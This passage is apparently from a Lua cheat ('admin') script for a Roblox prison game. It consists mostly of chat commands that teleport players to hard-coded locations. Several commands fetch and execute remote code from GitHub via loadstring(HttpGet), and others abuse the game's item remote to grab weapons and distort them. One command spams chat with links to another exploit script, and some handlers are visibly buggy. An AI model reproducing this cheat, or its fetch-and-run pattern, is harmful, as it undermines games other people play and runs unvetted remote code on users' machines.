            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("hr2") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-297.250732421875, 84.00051879882812, 2526.088134765625));
            Notify("Success", "Teleported " .. Player.Name .. " to houses roof 2.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("hr") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-295.0574951171875, 85.0084457397461, 2439.64892578125));
            Notify("Success", "Teleported " .. Player.Name .. " to houses roof.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("houses") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-202.79991149902344, 54.17512893676758, 2481.110107421875));
            Notify("Success", "Teleported " .. Player.Name .. " to Houses.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("shr") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-97.59503173828125, 79.7487564086914, 2412.50927734375));
            Notify("Success", "Teleported " .. Player.Name .. " to small house roof.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("smallhouse") or CMD("sh") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-96.72844696044922, 56.09928894042969, 2409.82763671875));
            Notify("Success", "Teleported " .. Player.Name .. " to small house.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("apr") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-304.2353515625, 54.17502212524414, 2135.096923828125));
            Notify("Success", "Teleported " .. Player.Name .. " to apartments.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("cityroof") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-323.6265869140625, 118.83882141113281, 1999.3377685546875));
            Notify("Success", "Teleported " .. Player.Name .. " to city roof.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("shoproof") or CMD('sr2') then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-341.98907470703125, 88.36956024169922, 1796.1947021484375));
            Notify("Success", "Teleported " .. Player.Name .. " to shop roof.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("storeroof") or CMD("sr") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-412.3269348144531, 71.59940338134766, 1755.07421875));
            Notify("Success", "Teleported " .. Player.Name .. " to store roof.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("hidingspot") or CMD("hs") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-347.8111572265625, 64.57244110107422, 1803.2864990234375));
            Notify("Success", "Teleported " .. Player.Name .. " to hiding spot.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("shops2") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(778.280029, 396.23996, 2674.35278, 0.998099327, 4.16638704e-06, -0.0616256408, 3.69708708e-08, 1, 6.82067985e-05, 0.0616256408, -6.80794183e-05, 0.998099327));
            Notify("Success", "Teleported " .. Player.Name .. " to shops 2.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("secret") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-430.9945373535156, 71.59940338134766, 1731.3880615234375));
            Notify("Success", "Teleported " .. Player.Name .. " to secret.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("store") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-417.1138610839844, 54.20008087158203, 1745.92822265625));
            Notify("Success", "Teleported " .. Player.Name .. " to store.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("gas") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-520.7560424804688, 54.393775939941406, 1654.55908203125));
            Notify("Success", "Teleported " .. Player.Name .. " to gas station.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("bridge") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-87.46949005126953, 33.49931335449219, 1324.4083251953125));
            Notify("Success", "Teleported " .. Player.Name .. " to bridge.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("shops") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(439.6669006347656, 11.425360679626465, 1215.47705078125));
            Notify("Success", "Teleported " .. Player.Name .. " to shops.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("powerline") or CMD("pwrline") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(911.0464477539062, 139.43991088867188, 2072.38623046875));
            Notify("Success", "Teleported " .. Player.Name .. " to powerline.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("office") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(706.15771484375, 103.10001373291016, 2344.278076171875));
            Notify("Success", "Teleported " .. Player.Name .. " to office.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("gate") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(504.4410400390625, 102.0399169921875, 2250.787109375));
            Notify("Success", "Teleported " .. Player.Name .. " to gate.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("gatetwr") or CMD("gt") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(500.2741394042969, 125.0399169921875, 2306.7822265625));
            Notify("Success", "Teleported " .. Player.Name .. " to gate tower.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("cellroof") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(956.5949096679688, 134.0049285888672, 2451.7646484375));
            Notify("Success", "Teleported " .. Player.Name .. " to cells roof.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("roof") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(932.247314453125, 136.9999542236328, 2235.9921875));
            Notify("Success", "Teleported " .. Player.Name .. " to roof.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("safe") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(933.4338989257812, 121.9676513671875, 2232.634521484375));
            Notify("Success", "Teleported " .. Player.Name .. " to safe.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("vent") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(934.0016479492188, 124.38994598388672, 2223.648681640625));
            Notify("Success", "Teleported " .. Player.Name .. " to vent.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("slide") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(515.8078002929688, 367.4695739746094, 3451.99755859375));
            Notify("Success", "Teleported " .. Player.Name .. " to slide area.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("1v1") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-236.87460327148438, 10.839909553527832, 1448.4461669921875));
            Notify("Success", "Teleported " .. Player.Name .. " to 1v1 spot.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("macdonalds2") or CMD("mcdonalds2") or CMD("mc2") or CMD("mac2") then
        if not myarguments.has_spawnedmcdonalds2 then
        myarguments.has_spawnedmcdonalds2 = true
        Notify("Loading", "Please wait...", 2);
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ellxzyie/Wrath/main/Models/Mcdonalds2.lua'))()
        Notify("Success", "Spawned Mcdonalds2.", 2);
        else
        game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-67.3360062, 3.20001101, 25.5391026, 0.0349006653, -5.27362642e-09, -0.999390781, -2.12764095e-09, 1, -5.3511422e-09, 0.999390781, 2.31310326e-09, 0.0349006653)
        Notify("Success", "Teleported to mcdonalds", 2);
        end
    end;
    if CMD("macdonalds3") or CMD("mcdonalds3") or CMD("mc3") or CMD("mac3") then
        if not myarguments.has_spawnedmcdonalds3 then
        myarguments.has_spawnedmcdonalds3 = true
        Notify("Loading", "Please wait...")
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ellxzyie/Wrath/main/Models/Mcdonalds3.lua'))()
        Notify("Success", "Spawned Mcdonalds3");
        else
        game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-84.1996231, 2458.79199, 174.260544, -0.996263027, -5.65577523e-08, 0.0863714442, -6.0232054e-08, 1, -3.99346263e-08, -0.0863714442, -4.49877184e-08, -0.996263027)
        Notify("Success", "Teleported to Mcdonalds3");
        end
    end; 
    if CMD("macdonalds4") or CMD("mcdonalds4") or CMD("mc4") or CMD("mac4") then
        if not myarguments.has_spawnedmcdonalds4 then
        myarguments.has_spawnedmcdonalds4 = true
        Notify("Loading", "Please wait...", 5);
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ellxzyie/Wrath/main/Models/Mcdonalds4.lua'))()
        Notify("Success", "Spawned mcdonalds4", 2);
        else
        game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-349.4, 8.78, -422.8)
        Notify("Success", "Teleported to mcdonalds4", 2);
        end
    end;
    if CMD("macdonalds") or CMD("mcdonalds") or CMD("mc") or CMD("mac") then
        if not myarguments.has_spawnedmcdonalds then
        myarguments.has_spawnedmcdonalds = true
        Notify("Loading", "Please wait...", 2);
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ellxzyie/Wrath/main/Models/OriginalMcdonalds.lua'))()
        Notify("Success", "Spawned Mcdonalds.", 2);
        else
        game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-20.500293731689453, 11865.7998046875, -24.149545669555664)
        Notify("Success", "Teleported to mcdonalds", 2);
        end
    end;
    if CMD("manginasal") then
        if not myarguments.has_spawnedmanginasal then
        myarguments.has_spawnedmanginasal = true
        Notify("Loading", "Please wait...", 5);
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ellxzyie/Wrath/main/Models/MangInasal.lua'))()
        Notify("Success", "Spawned mang inasal", 2);
        else
        game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(313, 591.438, -700)
        Notify("Success", "Teleported to mang inasal")
        end
    end;
    if CMD("sussy") or CMD("amongus") or CMD("amogus") then
        if not myarguments.has_spawnedsussybaka then
        myarguments.has_spawnedsussybaka = true
        Notify("Loading", "Please wait...", 5);
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ellxzyie/Wrath/main/Models/AmongSUS_Map.lua'))()
        Notify("Success", "Spawned amogus map", 2);
        else
        game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-6293.349, 1013.466, 222.278))
        Notify("Success", "Teleported to amogus", 2);
        end
    end;
    if CMD("area69") or CMD("area51") then
        if not myarguments.has_spawnedarea69 then
        myarguments.has_spawnedarea69 = true
        Notify("Loading", "Please wait...", 5);
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ellxzyie/Wrath/main/Models/Area69.lua'))()
        Notify("Success", "Spawned area51", 2);
        else 
        game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-6460.572, 1544.028, 294.289))
        Notify("Success", "Teleported to area51", 2);
        end
    end;
    if CMD("internetcafe") or CMD("incafe") then
        if not myarguments.has_spawnedinternetcafe then
        myarguments.has_spawnedinternetcafe = true
        Notify("Loading", "Please wait...", 5);
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ellxzyie/Wrath/main/Models/InternetCafe.lua'))()
        Notify("Success", "Spawned internet cafe", 2);
        else
        game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(414.569733, 15.3418102, 1399.30969, 0.999996662, 9.53135526e-08, -0.00258721341, -9.52223829e-08, 1, 3.53629588e-08, 0.00258721341, -3.51164786e-08, 0.999996662)
        Notify("Success", "Teleported to internet cafe", 2);
        end
    end;
    if CMD("piggymall") then
        if not myarguments.has_spawnedpiggymall then
        myarguments.has_spawnedpiggymall = true
        Notify("Loading", "Please wait...", 5);
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ellxzyie/Wrath/main/Models/PiggyMall.lua'))()
        Notify("Success", "Spawned piggy mall", 2);
        else
        game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-424.676, 289.201, -231.4)
        Notify("Success", "Teleported to piggy mall", 2);
        end
    end;
    if CMD("ad") or CMD("advertise") or CMD("script") or CMD("flex") or CMD("link") then
        Chat("LocalPlayer:kick() admin is better than your garbage triggered admin! (Tiger admin) Get LocalPlayer:kick() admin today at justpaste.it/a81yt");
        Chat("If the link above is not available, try alternate link to the script: rentry.co/keww4");
        Notify("Real", "Totally real script omg!");
    end;
    if CMD("nspawn") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(875.02471923828, 27.789987564087, 2348.7604980469));
            Notify("Success", "Teleported " .. Player.Name .. " to neutral spawn.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("mcw") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-926.08154296875, 94.1287612915039, 1990.0577392578125));
            Notify("Success", "Teleported " .. Player.Name .. " to middle criminal wharehouse.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("lcw") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-931.4274291992188, 94.1287612915039, 1916.49951171875));
            Notify("Success", "Teleported " .. Player.Name .. " to last criminal wharehouse.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("sew") or CMD('sewer') or CMD("swr") then -- real one
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(917.669921875, 78.69767761230469, 2428.47265625));
            Notify("Success", "Teleported " .. Player.Name .. " to sewer.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("scorp") or CMD('dumpster') then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(365.445374, 10.7605114, 1100.21265));
            Notify("Success", "Teleported " .. Player.Name .. " to dumpster.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("toilet") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(960.3410034179688, 101.33023071289062, 2476.3984375));
            Notify("Success", "Teleported " .. Player.Name .. " to toilet.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("snack") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(949.2426147460938, 101.42890930175781, 2340.570556640625));
            Notify("Success", "Teleported " .. Player.Name .. " to vending machine.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("trash") or CMD("scorpb") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(909.3489990234375, 100.31389617919922, 2286.896484375));
            Notify("Success", "Teleported " .. Player.Name .. " to trash.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("flag") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(724.799255, 129.352875, 2518.14087));
            Notify("Success", "Teleported " .. Player.Name .. " to flag.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("rb") then
        States.Rb = true
        Notify("Success", "Teleported " .. Player.Name .. " to flag.", 2);
    end
    if CMD("unrb") then
        States.Rb = false
        Notify("Success", "Teleported " .. Player.Name .. " to flag.", 2);
    end
    if CMD("rgb") then
        States.Rgb = true; 
        Notify("Success", "Rgb is on.", 2);
    end
    if CMD("unrgb") then
        States.Rgb = false;
        Notify("Success", "Rgb is off.", 2);
    end
    if CMD("getteam") then
        if Args[2] == nil then
			local GetTeam = LocalPlayer.TeamColor.Name
            Notify("Success", "Your team is " .. GetTeam .. ".", 2);
		else
			local Player = GetPlayer(Args[2], LocalPlayer)
			if Player then
        	    local GetTeam = Player.TeamColor.Name
        	    Notify("Success", Player.Name .. "'s team is " .. GetTeam .. ".", 2);
        	else
        	    Notify("Error", Args[2] .. " is not a valid player.", 2);
			end
        end
    end
    if CMD("pp") then
        GiveGuns()
        if CheckOwnedGamepass() then
            for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if v:IsA("Tool") then
                    v.Parent = game.Players.LocalPlayer.Backpack
                end
            end
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP)
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M4A1.ITEMPICKUP)
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single.Hammer.ITEMPICKUP)
			pcall(function()
                WhitelistItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Hammer"))
            end)
            game.Players.LocalPlayer.Backpack.M9.Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack["AK-47"].Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack.M4A1.Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
            wait()
            game.Players.LocalPlayer.Character.M9.GripPos = Vector3.new(0.9, 2, 5.2)
            game.Players.LocalPlayer.Character["Remington 870"].GripPos = Vector3.new(0.9, 2, 7.6)
            game.Players.LocalPlayer.Character.M4A1.GripPos = Vector3.new(0.9, 2, 17.5)
            game.Players.LocalPlayer.Character["AK-47"].GripPos = Vector3.new(0.9, 2, 12.8)
            game.Players.LocalPlayer.Character.Hammer.GripUp = Vector3.new(1, 1, -110)
            game.Players.LocalPlayer.Character.Hammer.GripPos = Vector3.new(0.9, 2.5, -1.5)
            wait()
            for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if v:IsA("Tool") then
                    v.Parent = game.Players.LocalPlayer.Backpack
                end
            end
            wait()
            game.Players.LocalPlayer.Backpack.M9.Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack["AK-47"].Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack.M4A1.Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
    else
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP)
        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single.Hammer.ITEMPICKUP)
        pcall(function()
            WhitelistItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Hammer"))
        end)
        game.Players.LocalPlayer.Backpack.M9.Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack["AK-47"].Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
        wait()
        game.Players.LocalPlayer.Character.M9.GripPos = Vector3.new(0.9, 2, 4.5)
        game.Players.LocalPlayer.Character["Remington 870"].GripPos = Vector3.new(1.4, 2, 6.8)
        game.Players.LocalPlayer.Character.M4A1.GripPos = Vector3.new(0.9, 2, 11)
        game.Players.LocalPlayer.Character["AK-47"].GripPos = Vector3.new(0.9, 2, 12)
        game.Players.LocalPlayer.Character.Hammer.GripUp = Vector3.new(1, 1, -110)
        game.Players.LocalPlayer.Character.Hammer.GripPos = Vector3.new(0.9, 1.8, -1.5)
        wait()
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        wait()
        game.Players.LocalPlayer.Backpack.M9.Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack["AK-47"].Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
    end
    end
    if CMD("megatower") then
        GiveGuns()
        if CheckOwnedGamepass() then
            for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if v:IsA("Tool") then
                    v.Parent = game.Players.LocalPlayer.Backpack
                end
            end
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP)
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M4A1.ITEMPICKUP)
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single.Hammer.ITEMPICKUP)
				pcall(function()
                    WhitelistItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Hammer"))
                end)
            game.Players.LocalPlayer.Backpack.M9.Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack["AK-47"].Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack.M4A1.Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
            wait()
            game.Players.LocalPlayer.Character.M9.GripPos = Vector3.new(0.9, 2, 0)
            game.Players.LocalPlayer.Character["Remington 870"].GripPos = Vector3.new(0.9, 2, 2)
            game.Players.LocalPlayer.Character.M4A1.GripPos = Vector3.new(0.9, 2, 11)
            game.Players.LocalPlayer.Character["AK-47"].GripPos = Vector3.new(0.9, 2, 7)
            game.Players.LocalPlayer.Character.Hammer.GripUp = Vector3.new(1, -0.1, 110)
            game.Players.LocalPlayer.Character.Hammer.GripPos = Vector3.new(0.9, -16, 1.5)
            game.Players.LocalPlayer.Character.Hammer.GripRight = Vector3.new(1, 0, 0)
            wait()
            for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if v:IsA("Tool") then
                    v.Parent = game.Players.LocalPlayer.Backpack
                end
            end
            wait()
            game.Players.LocalPlayer.Backpack.M9.Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack["AK-47"].Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack.M4A1.Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
    else
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP)
        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
        game.Players.LocalPlayer.Backpack.M9.Parent = game.Players.LocalPlayer.Character
        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single.Hammer.ITEMPICKUP)
				pcall(function()
                    WhitelistItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Hammer"))
                end)
        game.Players.LocalPlayer.Backpack["AK-47"].Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
        wait()
        game.Players.LocalPlayer.Character.M9.GripPos = Vector3.new(0.9, 2, 0)
        game.Players.LocalPlayer.Character["Remington 870"].GripPos = Vector3.new(0.9, 2, 2)
        game.Players.LocalPlayer.Character["AK-47"].GripPos = Vector3.new(0.9, 2, 7)
        game.Players.LocalPlayer.Character.Hammer.GripUp = Vector3.new(1, -0.1, 110)
        game.Players.LocalPlayer.Character.Hammer.GripPos = Vector3.new(0.9, -12, 1.5)
        game.Players.LocalPlayer.Character.Hammer.GripRight = Vector3.new(1, 0, 0)
        wait()
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        wait()
        game.Players.LocalPlayer.Backpack.M9.Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack["AK-47"].Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
        pcall(function()
            WhitelisteItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Hammer"))
        end)
    end
    end
    if CMD("sharp") then
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        game:GetService("Workspace").Remote.ItemHandler:InvokeServer(game:GetService("Workspace").Prison_ITEMS.single["Crude Knife"].ITEMPICKUP)
        game.Players.LocalPlayer.Backpack["Crude Knife"].Parent = game.Players.LocalPlayer.Character
        wait()
        game.Players.LocalPlayer.Character["Crude Knife"].GripUp = Vector3.new(1, -0.1, 110)
        game.Players.LocalPlayer.Character["Crude Knife"].GripPos = Vector3.new(1.4, 1.5, 1.5)
        wait()
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        wait()
        game.Players.LocalPlayer.Backpack["Crude Knife"].Parent = game.Players.LocalPlayer.Character
        pcall(function()
            WhitelisteItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Crude Knife"))
        end)
    end
    if CMD("pph") then
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        game:GetService("Workspace").Remote.ItemHandler:InvokeServer(game:GetService("Workspace").Prison_ITEMS.single.Hammer.ITEMPICKUP)
        game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
        wait()
        game.Players.LocalPlayer.Character.Hammer.GripUp = Vector3.new(1, 1, -110)
        game.Players.LocalPlayer.Character.Hammer.GripPos = Vector3.new(1.5, 1.8, -1.5)
        wait()
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        wait()
        game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
        pcall(function()
            WhitelistItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Hammer"))
        end)
    end
    if CMD("mh") then
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
